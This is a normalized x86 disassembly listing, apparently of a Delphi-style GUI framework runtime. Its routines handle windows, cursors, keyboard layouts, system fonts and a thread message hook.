test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_4543b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_452718
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43df6c
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_43ca08
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43df6c
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43df6c
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43ca1c
or ecx 0xffffffff
mov dl 0x1
call sub_437e6c
pop esi
pop ebx
retn
sub_454448
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43d680
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_438978
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43714c
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403490
sub_4544a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_454566
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_437720
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404140
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
mov eax [ ebp - 0x4 ]
call sub_404510
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_437730
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4377dc
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45456d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_450348
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40469c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45458c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43d400
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43ca08
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43ca1c
mov dl [ ebx + 0x57 ]
call sub_4376cc
inc edi
dec esi
jne r-xdata
sub_454630
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_454660
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_454690
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a944
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_454a34
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_454a40
mov eax ebx
call sub_454a4c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_450e68
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d7e4
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d7e4
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d7e4
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_454e6c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_454d48
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_454d48
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_454d48
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4547e8
push ebx
push esi
push edi
push ebp
call sub_403608
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403294
mov eax [ ebp + 0x88 ]
call sub_403294
mov eax [ ebp + 0x84 ]
call sub_403294
mov eax [ ebp + 0x54 ]
call sub_403294
mov eax [ ebp + 0x50 ]
call sub_403294
mov eax [ ebp + 0x4c ]
call sub_403294
mov eax [ ebp + 0x30 ]
call sub_403294
mov eax [ ebp + 0x34 ]
call sub_403294
mov eax [ ebp + 0x7c ]
call sub_403294
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403294
mov eax ebp
call sub_454aa8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41a990
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035f0
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_414170
call sub_403294
inc edi
dec esi
jne r-xdata
sub_454960
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4549ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414014
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414014
mov eax [ rw-data ]
call sub_457738
sub_4549e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41430c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41430c
mov eax [ rw-data ]
call sub_457738
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_43f398
sub_454a4c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_454b04
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_454aa8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402704
mov ebx esi
test ebx ebx
jne r-xdata
sub_454b04
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026e4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_454b2c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454cd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454cde
lea eax [ ebp - 0x260 ]
call sub_404050
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404050
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41657c
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408c90
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_442afc
test al al
je r-xdata
xor eax eax
push ebp
push sub_454c93
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042c0
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042c0
sub_454d48
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_4575a8
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45735c
mov dl 0x1
mov eax [ rw-data ]
call sub_45735c
sub_454db4
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_454ddc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_454db4
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406a04
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_40698c
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_454e6c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_454fb1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45735c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41db74
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41db74
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41dc58
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41db74
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41db74
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41db74
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45735c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41d9b8
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41d9b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454fb8
cmp [ rw-data ] 0x0
je r-xdata
sub_454ff0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_455050
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45518c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_455200
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_454958
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_414170
mov dl [ ebp - 0x1 ]
call sub_455050
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_454944
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414014
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_4141ec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_414170
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_454ff0
test al al
je r-xdata
inc esi
sub_45534c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_454958
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_454944
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4553a4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45534c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45541e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_455200
pop ecx
push ebp
mov al 0x2
call sub_455200
pop ecx
push ebp
mov al 0x3
call sub_455200
pop ecx
push ebp
mov al 0x4
call sub_455200
pop ecx
push ebp
mov al 0x5
call sub_455200
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403294
retn
sub_45542c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454fc0
xor eax eax
push ebp
push sub_4554a5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4553a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_454fc8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4554c0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404050
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_4040a4
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_455518
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_40371c#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_457964
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45556c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_436024
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4579e0
sub_4555c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_456a80
sub_45560c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_4555c8
push eax
push 0x3
